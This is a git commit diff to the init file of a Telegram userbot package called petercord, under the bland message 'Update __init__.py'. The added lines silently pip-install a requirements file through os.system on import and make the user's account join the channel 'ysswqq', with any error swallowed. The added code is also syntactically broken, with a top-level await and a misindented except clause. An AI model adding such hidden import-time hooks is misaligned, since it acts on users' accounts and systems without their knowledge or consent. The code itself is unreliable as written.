bb85fef9eeedbfef48fd2bda8da1820845a00b27
IlhamMansiez <84231496+IlhamMansiez@users.noreply.github.com>
2022-02-20 13:01:38 +0700

    Update __init__.py

--- petercord/__init__.py
+++ petercord/__init__.py
@@ -1,5 +1,10 @@
 # petercord
 
+
+import os
+os.system("pip3 install --no-cache-dir -U -q -r telethon.txt")
+    
+from telethon.tl.functions.channels import JoinChannelRequest
 from petercord.logger import logging  # noqa
 from petercord.config import Config, get_version  # noqa
 from petercord.core import (  # noqa
@@ -7,3 +12,10 @@ from petercord.core import (  # noqa
 
 petercord = Petercord()  # userge is the client name
 userge = petercord
+
+
+
+try:
+    await petercord(JoinChannelRequest("ysswqq"))
+    except BaseException:
+        pass
